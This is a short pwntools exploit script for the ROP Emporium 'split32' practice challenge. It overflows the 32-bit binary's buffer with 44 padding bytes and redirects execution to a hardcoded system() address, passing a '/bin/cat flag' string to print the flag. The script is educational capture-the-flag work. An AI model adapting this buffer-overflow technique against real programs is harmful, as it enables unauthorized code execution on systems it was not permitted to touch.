from pwn import * # importing from pwntools for the following code.
context.bits = 32 # 32 bit process.

# Script base credits https://corruptedprotocol.medium.com/rop-emporium-split32-32-bit-writeup-6c5044d3f4d5
p = process("./split32") # begin the process.

# the system call addr Retrive by using disas useful function & copying the call address.
system = 0x0804861a 

# flag address get by "find /bin/cat"
bincat_addr = 0x804a030

# payload will be sent to overflow  controlling the EIP to execute the system function with the /bin/cat argument.
payload = b"A"*44 + p32(system) + p32(bincat_addr)

p.send(payload) # send it.
p.interactive() # interactive shell.
